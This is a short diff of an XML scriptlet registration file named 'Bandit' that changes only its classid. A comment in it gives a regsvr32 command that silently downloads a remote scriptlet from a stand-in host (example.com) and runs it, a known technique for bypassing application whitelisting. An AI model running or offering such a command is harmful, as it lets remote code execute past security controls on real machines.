@@ -5,7 +5,7 @@
     description="Bandit"
     progid="Bandit"
     version="1.00"
-    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+    classid="{AAAA1111-0000-9999-0000-0000FEEDACDC}"
 	>
 	
 	<!-- regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
